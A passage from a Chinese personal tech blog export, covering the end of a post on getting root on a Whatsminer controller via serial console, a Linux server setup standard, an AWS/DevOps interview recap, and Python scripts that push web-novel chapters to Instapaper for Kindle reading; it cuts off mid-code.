</ol>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/IMG_20220629_103733.jpg" alt="获得 root 权限后的界面"></p>
<h2 id="电脑端配置"><a href="#电脑端配置" class="headerlink" title="电脑端配置"></a>电脑端配置</h2><p>我在 MacOS 未成功，最后用的是 Windows + Putty 配置成功了，连接的端口看下“设备管理器”，连接的其他配置参数为：115200,8,无,1,无</p>
<h2 id="测试过的系统软件版本"><a href="#测试过的系统软件版本" class="headerlink" title="测试过的系统软件版本"></a>测试过的系统软件版本</h2><p>这个不是所有版本的控制板都可行的。猜想应该是早期工程师用来调试用的，后来把这个关掉了。据我测试的版本来说：</p>
<ul>
<li>20200409.20.REL 可以</li>
<li>H6OS-V10-20210520.22.REL 不行</li>
<li>H6OS-V10-20210325.22.REL 不行</li>
<li>H3-V10-20200609.22.REL 可以！</li>
</ul>
]]></content>
      <tags>
        <tag>root</tag>
        <tag>whatsminer</tag>
        <tag>神马矿机</tag>
        <tag>M21</tag>
        <tag>M20</tag>
        <tag>M30</tag>
        <tag>OpenWRT</tag>
        <tag>hack</tag>
        <tag>ttl</tag>
        <tag>ch341a</tag>
        <tag>编程器</tag>
        <tag>杜邦线</tag>
        <tag>putty</tag>
        <tag>cp2102</tag>
        <tag>pl2303</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器操作系统安装配置标准推荐</title>
    <url>/2019/09/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%A0%87%E5%87%86%E6%8E%A8%E8%8D%90/index.html</url>
    <content><![CDATA[<h1 id="操作系统安装配置规范"><a href="#操作系统安装配置规范" class="headerlink" title="操作系统安装配置规范"></a>操作系统安装配置规范</h1><p>从事运维这么长时间，每到一个新公司，都会涉及到写标准化、规范化、流程化、制度化文档的工作，这里就整理了一份，但愿对大家有帮助。</p>
<h2 id="操作系统选型"><a href="#操作系统选型" class="headerlink" title="操作系统选型"></a>操作系统选型</h2><p>以下都是推荐值，如果没有特殊的需求，请都按照以下推荐值来操作</p>
<ul>
<li>实体机：首选 CentOS 7 系列的最新版，其次选 Ubuntu Server 的最新的 LTS 的 64 位版本，目前最新的是 18.04</li>
<li>阿里云：选 Aliyun Linux 2 的最新版，当下是 2.1903；选 64 位版本</li>
<li>AWS：选 Amazon LInux 2 的最新版；选 64 位版本</li>
</ul>
<span id="more"></span>

<h2 id="操作系统安装"><a href="#操作系统安装" class="headerlink" title="操作系统安装"></a>操作系统安装</h2><h3 id="SWAP-区"><a href="#SWAP-区" class="headerlink" title="SWAP 区"></a>SWAP 区</h3><p>现在基本上云主机缺省都没有 SWAP 区。</p>
<p>建议：</p>
<ul>
<li>启用 SWAP 区，大小跟物理内存一样即可</li>
<li>在 kernel 参数里调低使用 SWAP 区的概率，详见 [[#10]]</li>
</ul>
<h3 id="公网地址"><a href="#公网地址" class="headerlink" title="公网地址"></a>公网地址</h3><ul>
<li>安装时不要选公网</li>
<li>如果需要公网<ul>
<li>安装完以后单独购买 EIP，并绑定过来（需要注意的是：可能需要提高可买 EIP 数量的限额）</li>
</ul>
</li>
</ul>
<h3 id="安全组"><a href="#安全组" class="headerlink" title="安全组"></a>安全组</h3><ul>
<li>如无特殊需求一定要勾选 sg-whitelist 安全组</li>
<li>如有公网登录管理需求请勾选 sg-ssh 安全组</li>
<li>跑 web 服务的服务器还要勾选 sg-web 安全组</li>
</ul>
<h3 id="数据盘"><a href="#数据盘" class="headerlink" title="数据盘"></a>数据盘</h3><ul>
<li>裸盘格式化成 ext4 文件系统</li>
<li>挂载到系统的 &#x2F;data 下</li>
<li>&#x2F;etc&#x2F;fstab 里用 UUID 取代设备名，dump 和 fsck 两个选项都用 0</li>
</ul>
<h2 id="操作系统配置"><a href="#操作系统配置" class="headerlink" title="操作系统配置"></a>操作系统配置</h2><h3 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h3><p>idc 名称-项目-角色-集群-节点</p>
<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><ul>
<li>新建一个 sre 组</li>
<li>sre 组是运维团队所有成员及用户 deploy 的副组</li>
<li>每个运维团队成员都单独建一个账号并为每个成员部署自己的公钥</li>
<li>新建 deploy 用户</li>
<li>部署 deploy 用户的公钥（私钥在 {K77}，~&#x2F;.ssh&#x2F;authenticated_keys 文件里写公钥之前，写 from&#x3D;”10.254.1.201&#x2F;32 “，这里假设 10.254.1.201 是用 deploy 用户登录服务器的 IP 地址）</li>
</ul>
<h3 id="ssh-配置"><a href="#ssh-配置" class="headerlink" title="ssh 配置"></a>ssh 配置</h3><ul>
<li>禁止 root 直接登录</li>
<li>禁止非 root 用户密码登录</li>
<li>端口号改成 38522（三号楼 B 座 5 层 22 端口）</li>
</ul>
<h3 id="yum-配置"><a href="#yum-配置" class="headerlink" title="yum 配置"></a>yum 配置</h3><p>参见文档：[[|]]</p>
<h3 id="sudo-权限"><a href="#sudo-权限" class="headerlink" title="sudo 权限"></a>sudo 权限</h3><p>设置 sre 组有不需要密码用 root 身份执行所有命令的权限</p>
<h3 id="kernel-调优"><a href="#kernel-调优" class="headerlink" title="kernel 调优"></a>kernel 调优</h3><p>调优的一些 kernerl 参数，放在 &#x2F;etc&#x2F;sysctl.d&#x2F; 目录下的文件里</p>
<h4 id="disable-IPv6"><a href="#disable-IPv6" class="headerlink" title="disable IPv6"></a>disable IPv6</h4><p><code>cat /etc/sysctl.d/disableipv6.conf</code>，显示内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.ipv6.conf.all.disable_ipv6 = 1</span><br><span class="line">net.ipv6.conf.default.disable_ipv6 = 1</span><br></pre></td></tr></table></figure>

<h4 id="NETWORK"><a href="#NETWORK" class="headerlink" title="NETWORK"></a>NETWORK</h4><p><code>cat /etc/sysctl.d/network.conf</code>，显示内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 尽可能多的扩展本地端口使用范围</span><br><span class="line">net.ipv4.ip_local_port_range = 1025    65535</span><br><span class="line"># accept 队列（保存 ESTABLISHED 状态的连接队列）。</span><br><span class="line"># 队列长度为 min(net.core.somaxconn,backlog)，</span><br><span class="line"># syncookies 打开的情况下，不需要设置太大，但缺省的 128 实在有点小</span><br><span class="line">net.core.somaxconn = 2048</span><br><span class="line"># 半连接队列（保存SYN_RECV状态的队列）的长度，</span><br><span class="line"># syncookies 打开的情况下，不需要设置太大</span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 2048</span><br></pre></td></tr></table></figure>

<h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><p><code>cat /etc/sysctl.d/os.conf</code>，显示内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 尽可能少的使用 swap</span><br><span class="line">vm.swappiness = 10</span><br></pre></td></tr></table></figure>

<h3 id="时区配置"><a href="#时区配置" class="headerlink" title="时区配置"></a>时区配置</h3><p>Aliyun Linux 的话，不需要配置，直接就是好的。</p>
<p>否则：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">mv</span> localtime localtime.bak</span><br><span class="line"><span class="built_in">ln</span> -s /usr/share/zoneinfo/Asia/Shanghai localtime</span><br></pre></td></tr></table></figure>

<h3 id="自启动服务调整"><a href="#自启动服务调整" class="headerlink" title="自启动服务调整"></a>自启动服务调整</h3><p>如下服务是建议取消随机自启动的：</p>
<ul>
<li>atd</li>
<li>aliyun（阿里云自带服务，建议干掉）</li>
<li>aegis（阿里云自带服务，建议干掉）</li>
</ul>
<p>参照如下代码，将不需要随机自启动的服务干掉：</p>
<a href="/2019/08/How%20to%20disable%20startup%20services%20from%20Aliyun/index.html" title="How to disable startup services from Aliyun">How to disable startup services from Aliyun</a>

<h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><p>参见 [[#kernel | kernel 调优]]部分</p>
<h3 id="disable-SELinux"><a href="#disable-SELinux" class="headerlink" title="disable SELinux"></a>disable SELinux</h3><p>Aliyun Linux 不用做，缺省就是 disable 的。</p>
<p>其他的，用如下代码：</p>
<a href="/2019/07/How%20to%20disable%20SELinux%20on%20CentOS%207.x/index.html" title="How to disable SELinux on CentOS 7.x in code">How to disable SELinux on CentOS 7.x in code</a>

<h3 id="定时任务（cron）"><a href="#定时任务（cron）" class="headerlink" title="定时任务（cron）"></a>定时任务（cron）</h3><p>定时任务的配置文件，按照具体情况不同，分别放到如下目录下：</p>
<ul>
<li>&#x2F;etc&#x2F;cron.monthly：用来放每月执行但不太关心具体执行时间的任务</li>
<li>&#x2F;etc&#x2F;cron.weekly：用来放每周执行但不关心具体执行时间的任务</li>
<li>&#x2F;etc&#x2F;cron.daily：用来放每天执行但不关心具体执行时间的任务</li>
<li>&#x2F;etc&#x2F;cron.hourly：用来放每小时执行但不关心具体执行时间的任务</li>
<li>&#x2F;etc&#x2F;cron.d：用来放不适合放如上四个目录的任务</li>
</ul>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>规范</tag>
        <tag>标准</tag>
        <tag>优化</tag>
      </tags>
  </entry>
  <entry>
    <title>某个外包公司的面试总结</title>
    <url>/2022/04/%E6%9F%90%E4%B8%AA%E5%A4%96%E5%8C%85%E5%85%AC%E5%8F%B8%E7%9A%84%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>无非就是“又”失业了，重新开始找工作，原本还不想招惹外包公司，无奈行情不好，外包工作也是工作呀，于是乎，就定了某个外包公司的面试，第一面：外包公司的技术面。</p>
<span id="more"></span>

<h2 id="心得体会"><a href="#心得体会" class="headerlink" title="心得体会"></a>心得体会</h2><p>主要问题都是跟 aws 有关系，这个岗位的甲方是个外企，肯定重度使用 aws。而且还在用 aws 的 eks 服务。</p>
<p>感觉面试官的视野还是很重要的。</p>
<h2 id="几个具体问题"><a href="#几个具体问题" class="headerlink" title="几个具体问题"></a>几个具体问题</h2><p>有个细节：腾讯会议面试，面试官几个人，可能是三个，首先特意让我把视频打开，于是我打开了，但是对方并没有打开。好吧，我是求职者，不对等也正常。</p>
<p>但为什么面试需要让面试者打开视频呢？这个不太明白，也许相关 HR 会比较清楚这一点。</p>
<h3 id="关于-eks-的-ingress"><a href="#关于-eks-的-ingress" class="headerlink" title="关于 eks 的 ingress"></a>关于 eks 的 ingress</h3><p>问我 eks 里的服务通过 ingress 暴露出去，然后数据包是怎么从外网到 pod 的。</p>
<p>这个题我答的不好，前东家其实差不多就是这个架构：nginx-ingress，然后外面是 aws 的 LB，我一直在解释外网流量到 aws 的 LB 设备之后然后是转到 eks 集群的 node 节点的某个 tcp 端口，我的意思是，其实服务最终是通过 nodeport 透出去的。</p>
<p>上面我说的这个大概是基本上没太大问题的，但是人家问的应该不是这个。:(</p>
<p>其实上面我提到的 nodeport 透出去的服务正是 nginx-ingress（或者是 nginx-ingress-controller，具体忘了，我得再看看 nginx-ingress）</p>
<h3 id="关于被-nginx-反代的服务如何获得客户端的真实-IP-的问题"><a href="#关于被-nginx-反代的服务如何获得客户端的真实-IP-的问题" class="headerlink" title="关于被 nginx 反代的服务如何获得客户端的真实 IP 的问题"></a>关于被 nginx 反代的服务如何获得客户端的真实 IP 的问题</h3><p>这个其实我比较熟悉，http 基本协议嘛。</p>
<p>我说这个简单，在反代的 nginx 配置里将 client ip 直接写入一个特定的 http 头，然后真实的服务里再把这个头取出来即可。</p>
<p>其实这个回答完全没毛病，我之前有项目就是这么干的。但面试官却感觉好像抓住了什么一样拼命问我到底是哪个 http 头？搞得我都有点上头了，我于是说：“哪个头不一样吗，只要跟后端协商好了就行了”。还被追问，还问一般标准是哪个头，于是我只能说 X-Forwarded-For，于是面试官认可了。</p>
<p>我其实没有细说为什么要另外弄一个头，这是因为客户端访问服务，中间可能会过 n 层代理，理论上每一层都会且必须要往 X-Forwarded-For 里写东西，但实际上，守规矩的人有，但绝对不是全部！于是我们的逻辑就是单独再搞一个 http 头，算是有点私有协议的意思，自己用，这样感觉比直接用 X-Forwarded-For 更靠谱一些。</p>
<h3 id="Jenkins-怎么做代码触发自动构建（CI）"><a href="#Jenkins-怎么做代码触发自动构建（CI）" class="headerlink" title="Jenkins 怎么做代码触发自动构建（CI）"></a>Jenkins 怎么做代码触发自动构建（CI）</h3><p>某个面试官问的，我当时回答：我不知道。我真不知道，或者我们曾经也有用过这种功能，但因为具体不是我配的，我就没了解到。但我知道，这个是绝度可以实现的，大致猜想是通过 webhook 之类的东西来做就可以。</p>
<p>我又说，我们有时并没有用 Jenkins，面试官就逼问：“没有 Jenkins 怎么做 CI&#x2F;CD 呢？”，我当时就笑了，说：“我的好几个前司，项目的 CI&#x2F;CD 是直接在 gitlab 里做的。”（他可能不太清楚 gitlab 本身就有 CI&#x2F;CD 的功能）。而我恰恰由于要维护这个，曾经大概看过相关配置。</p>
<p>估计他也不知道 github-action 之类的东西吧。</p>
<h3 id="关于-serverless"><a href="#关于-serverless" class="headerlink" title="关于 serverless"></a>关于 serverless</h3><p>我回答说之前的某司，我用过 aws 上的什么服务来着（我真是这么说的，我忘了那个叫 Lambda 了），用那个写了个 python 程序，定时执行一些操作。那个我理解就是 serverless</p>
<h3 id="用过多少-aws-的服务"><a href="#用过多少-aws-的服务" class="headerlink" title="用过多少 aws 的服务"></a>用过多少 aws 的服务</h3><p>于是我就说了一堆，但的确好多服务我忘了名字了，我只能简单介绍下这个服务是干啥的。我估计我用的好多服务面试官们也没用过，：）。这个很正常，就像他们用过的服务有些我也没用过一样。</p>
<h3 id="eks-中的服务暴露出来的几种方法"><a href="#eks-中的服务暴露出来的几种方法" class="headerlink" title="eks 中的服务暴露出来的几种方法"></a>eks 中的服务暴露出来的几种方法</h3><p>我居然只回答出 nodeport 和 ingress 两种，连 LB 设备这个都忘了。:(</p>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>最终的结果，自然是挂了呀。:(</p>
]]></content>
      <tags>
        <tag>面试总结</tag>
        <tag>外包公司</tag>
        <tag>aws</tag>
        <tag>eks</tag>
        <tag>Jenkins</tag>
        <tag>ingress</tag>
        <tag>X-Forwarded-For</tag>
        <tag>CI/CD</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Kindle 来追网文之三</title>
    <url>/2021/11/%E7%94%A8%20Kindle%20%E6%9D%A5%E8%BF%BD%E7%BD%91%E6%96%87%E4%B9%8B%E4%B8%89/index.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前学 python 做爬虫爬书时水过两篇文章（加上本篇，一共三篇）：</p>
<ul>
<li><a href="/2020/05/%E7%94%A8kindle%E8%BF%BD%E7%BD%91%E6%96%87/index.html" title="用 Kindle 来追网文">用 kindle 追网文</a> </li>
<li><a href="/2020/07/%E7%94%A8%20Kindle%20%E8%BF%BD%E7%BD%91%E6%96%87_2/index.html" title="用 Kindle 来追网文之二">用 Kindle 追网文之二</a></li>
<li><a href="/2021/11/%E7%94%A8%20Kindle%20%E6%9D%A5%E8%BF%BD%E7%BD%91%E6%96%87%E4%B9%8B%E4%B8%89/index.html" title="用 Kindle 来追网文之三">用 Kindle 来追网文之三</a></li>
</ul>
<p>当下，由于种种原因要切源到：m.uuks.org，所以有了第三篇水文：）</p>
<span id="more"></span>

<h2 id="show-me-the-code"><a href="#show-me-the-code" class="headerlink" title="show me the code"></a>show me the code</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> importlib <span class="keyword">import</span> reload</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> pyinstapaper.instapaper <span class="keyword">import</span> Instapaper, Folder, Bookmark</span><br><span class="line"></span><br><span class="line">INSTAPAPER_KEY = <span class="string">&#x27;*****************&#x27;</span></span><br><span class="line">INSTAPAPER_SECRET = <span class="string">&#x27;**************&#x27;</span></span><br><span class="line">INSTAPAPER_LOGIN = <span class="string">&#x27;u@x.com&#x27;</span></span><br><span class="line">INSTAPAPER_PASSWORD = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&#x27;http://m.uuks.org&#x27;</span></span><br><span class="line">novel_list = [</span><br><span class="line">    <span class="string">&quot;苏厨&quot;</span>, <span class="string">&quot;绍宋&quot;</span>, <span class="string">&quot;从 1983 开始&quot;</span>, <span class="string">&quot;全职艺术家&quot;</span>, <span class="string">&quot;大明镇海王&quot;</span>, <span class="string">&quot;奶爸学园&quot;</span></span><br><span class="line">]</span><br><span class="line">novel_url = [</span><br><span class="line">    <span class="string">&#x27;392_392855&#x27;</span>, <span class="string">&#x27;511_511286&#x27;</span>, <span class="string">&#x27;441_441819&#x27;</span>, <span class="string">&#x27;32802&#x27;</span>, <span class="string">&#x27;519_519302&#x27;</span>, <span class="string">&quot;33250&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">instapaper = Instapaper(INSTAPAPER_KEY, INSTAPAPER_SECRET)</span><br><span class="line">instapaper.login(INSTAPAPER_LOGIN, INSTAPAPER_PASSWORD)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_bookmark_instapaper</span>(<span class="params">title, url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>: time.time(),</span><br><span class="line">        <span class="string">&#x27;progress_timestamp&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: url</span><br><span class="line">    &#125;</span><br><span class="line">    bookmark = Bookmark(instapaper, **data)</span><br><span class="line">    bookmark.add()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_novel</span>(<span class="params">novel_list, novel_url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;job running&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;url.pkl&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            last_url = pickle.load(f)</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#last_url=[[],[],[],[]]</span></span><br><span class="line">        last_url = [[]] * <span class="built_in">len</span>(novel_list)</span><br><span class="line"></span><br><span class="line">    url_archive = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(novel_list)):</span><br><span class="line">        <span class="built_in">print</span>(novel_list[j])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            old_url = last_url[j]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            old_url = []</span><br><span class="line">        url = base_url + <span class="string">&#x27;/b/&#x27;</span> + novel_url[j] + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        head = &#123;&#125;</span><br><span class="line">        head[</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>] = <span class="string">&#x27;Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19&#x27;</span></span><br><span class="line">        page = requests.get(url)</span><br><span class="line">        soup = BeautifulSoup(page.content, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        soup_text = soup.select(</span><br><span class="line">            <span class="string">&#x27;#book-sp &gt; div.listbox &gt; div.list_cont &gt; div.book-detial &gt; div.ml-list &gt; ul a&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        latest_url = []</span><br><span class="line">        latest_title = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(soup_text)):</span><br><span class="line"></span><br><span class="line">            latest_url.append(base_url + soup_text[i][<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">            latest_title.append(novel_list[j] + <span class="string">&#x27;---&#x27;</span> +</span><br><span class="line">                                 soup_text[i].string)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(latest_url)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> latest_url[k] <span class="keyword">in</span> old_url:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(latest_title[k], latest_url[k])</span><br><span class="line">            add_bookmark_instapaper(latest_title[k], latest_url[k])</span><br><span class="line"></span><br><span class="line">        old_url = latest_url</span><br><span class="line">        url_archive.append(old_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(url_archive, f)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bookmarks = instapaper.get_bookmarks(<span class="string">&#x27;unread&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ct, bookmark <span class="keyword">in</span> <span class="built_in">enumerate</span>(bookmarks):</span><br><span class="line">    <span class="built_in">print</span>(bookmark.title)</span><br><span class="line">    bookmark.archive()</span><br><span class="line">    bookmark.delete()</span><br><span class="line"></span><br><span class="line">fetch_novel(novel_list, novel_url)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Kindle</tag>
        <tag>Python</tag>
        <tag>Python3</tag>
        <tag>Instapaper</tag>
        <tag>爬虫</tag>
        <tag>网络小说</tag>
        <tag>UU看书</tag>
        <tag>uuks.org</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Kindle 来追网文之二</title>
    <url>/2020/07/%E7%94%A8%20Kindle%20%E8%BF%BD%E7%BD%91%E6%96%87_2/index.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>前面的文章 <a href="/2020/05/%E7%94%A8kindle%E8%BF%BD%E7%BD%91%E6%96%87/index.html" title="用 Kindle 来追网文">用 kindle 追网文</a> 提到了一种用 kindle 追网文的方式，正常工作过一段时间之后，情况又发生变化了：每个章节都被拆成两个页面。这样就导致我只抓了每个章节的第一个页面，第二个页面没抓，自然内容也就不完整了。这部分内容主要是对 <a href="/2020/05/%E7%94%A8kindle%E8%BF%BD%E7%BD%91%E6%96%87/index.html" title="用 Kindle 来追网文">用 kindle 追网文</a> 的代码做了些简单的改动，以适应最新情况。</p>
<span id="more"></span>

<h2 id="新方案"><a href="#新方案" class="headerlink" title="新方案"></a>新方案</h2><p>其他部分都没变，只是 Python 程序稍稍修改了一下（同时还做了下格式的修改，显得更专业一些：），具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> pyinstapaper.instapaper <span class="keyword">import</span> Instapaper, Folder, Bookmark</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下四个变量根据自己的情况填写</span></span><br><span class="line">INSTAPAPER_KEY = <span class="string">&#x27;************************&#x27;</span></span><br><span class="line">INSTAPAPER_SECRET = <span class="string">&#x27;*********************&#x27;</span></span><br><span class="line">INSTAPAPER_LOGIN = <span class="string">&#x27;u@x.com&#x27;</span></span><br><span class="line">INSTAPAPER_PASSWORD = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 几本书，用来做例子</span></span><br><span class="line">novel_list = [</span><br><span class="line">    <span class="string">&quot;苏厨&quot;</span>,</span><br><span class="line">    <span class="string">&quot;王老实的幸福生活&quot;</span>,</span><br><span class="line">    <span class="string">&quot;大魔王又出手了&quot;</span></span><br><span class="line">]</span><br><span class="line">novel_url = [</span><br><span class="line">    <span class="string">&#x27;392_392855&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7_7669&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;431_431648&#x27;</span></span><br><span class="line">]</span><br><span class="line">base_url = <span class="string">&#x27;https://m.xinxs.la&#x27;</span></span><br><span class="line"></span><br><span class="line">instapaper = Instapaper(INSTAPAPER_KEY, INSTAPAPER_SECRET)</span><br><span class="line">instapaper.login(INSTAPAPER_LOGIN, INSTAPAPER_PASSWORD)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_bookmark_instapaper</span>(<span class="params">title, url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>: time.time(),</span><br><span class="line">        <span class="string">&#x27;progress_timestamp&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: title,</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: url</span><br><span class="line">    &#125;</span><br><span class="line">    bookmark = Bookmark(instapaper, **data)</span><br><span class="line">    bookmark.add()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_novel</span>(<span class="params">novel_list, novel_url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;job running&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;url.pkl&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.pkl&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            last_url = pickle.load(f)</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        last_url = [[]] * <span class="built_in">len</span>(novel_list)</span><br><span class="line"></span><br><span class="line">    url_archive = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(novel_list)):</span><br><span class="line">        <span class="built_in">print</span>(novel_list[j])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            old_url = last_url[j]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            old_url = []</span><br><span class="line">        url = base_url + <span class="string">&#x27;/&#x27;</span> + novel_url[j] + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        head = &#123;&#125;</span><br><span class="line">        head[</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>] = <span class="string">&#x27;Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19&#x27;</span></span><br><span class="line">        page = requests.get(url)</span><br><span class="line">        soup = BeautifulSoup(page.content, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        soup_text = soup.select(</span><br><span class="line">            <span class="string">&#x27;body &gt; div.container &gt; div.row.row-section &gt; div &gt; div:nth-of-type(1) &gt; ul &gt; li &gt; a&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        latest_url = []</span><br><span class="line">        latest_title = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(soup_text)):</span><br><span class="line">            latest_url.append(base_url + soup_text[i][<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">            latest_title.append(novel_list[j] + <span class="string">&#x27;---&#x27;</span> +</span><br><span class="line">                                soup_text[i].string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(latest_url)):</span><br><span class="line">            <span class="keyword">if</span> latest_url[k] <span class="keyword">in</span> old_url:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># latest_url[k].replace(&quot;.html&quot;, &quot;_2.html&quot;) 是第二部分的 url</span></span><br><span class="line">            <span 